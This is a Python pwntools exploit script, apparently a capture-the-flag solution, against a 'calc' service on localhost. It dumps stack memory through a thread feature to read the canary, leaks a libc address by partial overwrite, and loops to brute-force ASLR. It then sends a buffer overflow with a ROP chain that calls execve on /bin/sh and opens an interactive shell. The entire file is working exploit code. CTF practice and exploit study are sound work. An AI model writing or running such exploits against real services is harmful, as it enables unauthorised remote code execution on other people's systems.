import pwn

pwn.context.clear(aslr=True, terminal=["tmux", "splitw", "-fh"], binary=pwn.ELF("assets/calc"))
libc = pwn.context.binary.libc

CMD = b"/bin/shh\x00"

# based off offset from lib-c start
POP_RSI = 0x00000000000f0ffc
POP_RAX = 0x00000000000d4177
SYSCALL = 0x00000000000255e5

tries = 0

while(1):
    try:
        tries+=1
        # p: pwn.process = pwn.gdb.debug("src/calc", GDB_SCRIPT)
        p = pwn.remote("localhost", 4444)

        p.recvline()

        print("Grabbing stack data...")

        # enter global data
        for i in range(256):
            p.sendline(hex(i).encode())

        def handle_threads_prompt(threads: bytes):
            p.sendline(b'q') # end global data
            p.sendline(threads)
            p.recvlines(2)

        # spawn threads
        greatest_found = 0
        data = bytearray(256)
        while greatest_found < 255:
            threads = 0xff - greatest_found # make enough threads to get all data
            handle_threads_prompt(hex(threads).encode())
            lines: list[bytes] = p.recvlines(threads)
            for line in lines:
                tokens = line.split(b" ")
                addr = int(tokens[1], 16)
                data[addr] = int(tokens[3], 16)
                if addr > greatest_found:
                    greatest_found = addr

        handle_threads_prompt(b'q')

        stack_canary = int.from_bytes(data[8:16], "little")
        print(f"Stack canary: {hex(stack_canary)}")

        print("Trying to leak lib-c...")

        p.sendline(b'y') # give feedback
        p.sendline(b"A" * 104) # replace lower 2 bytes of resp with b'\n\x00'

        # get feedback prompt
        p.recvuntil(b":")
        p.recv(1)

        strlen_page_addr = p.recvuntil(b'\n', True)
        if len(strlen_page_addr) != 4:
            print("failed to get address")
            continue
        
        # Pick random offset and hope ASLR hits
        strlen_addr = int.from_bytes(b'\x40\x40' + strlen_page_addr, 'little')
        print(f"possible lib-c strlen address: {hex(strlen_addr)}")

        libc_addr = strlen_addr - 0x16f040
        print(f"possible lib-c base address: {hex(libc_addr)}")

        # get feedback prompt
        p.recvuntil(b":")
        p.recv(1)

        ROP = b''.join([pwn.p64(v) for v in [libc_addr + POP_RSI, 0, libc_addr + POP_RAX, 59, libc_addr + SYSCALL]])

        # (cmd + filler)(0x78) + canary(0x8) + filler(0x8) + RBX(0x8) + RBP(0x8) + ret(ROP)
        p.sendline(CMD + b'A'*(0x78 - len(CMD)) + pwn.p64(stack_canary) + b"A"*8 + b"B"*8 + b"C"*8 + ROP)

        print("testing shell...")
        p.sendline(b'ls')
        print(p.recvline().decode())

        print(f"Got shell after {tries} tries")

        p.interactive()
        
        exit(1)
    
    except(EOFError):
        pass
    finally:
        p.close()
